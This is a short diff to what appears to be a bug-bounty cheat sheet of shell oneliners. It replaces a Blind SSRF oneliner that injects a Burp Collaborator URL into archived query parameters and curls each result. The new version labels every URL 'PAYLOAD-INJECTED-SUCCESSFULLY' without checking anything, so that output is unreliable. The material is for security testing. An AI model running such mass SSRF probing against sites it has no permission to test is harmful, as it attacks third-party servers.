@@ -6,7 +6,7 @@
 
 # Blind SSRF Oneliner:
 
-`cat waybackurls.txt|grep -a -i \=http|qsreplace 'https://your-burp-collab.com'|while read host do;do curl -s -L $host -I|grep "your-burp-collab.com" && echo "$host \033[0;31m[+]VULNERABLE-TO-SSRF\n";done`
+`cat wayback.txt|gf ssrf |qsreplace 'https://your-burp-collab'|while read url; do ssrf=$(curl -s -L $url);echo -e "$url --> PAYLOAD-INJECTED-SUCCESSFULLY";done`
 
 # Open Redirect Oneliner:
 
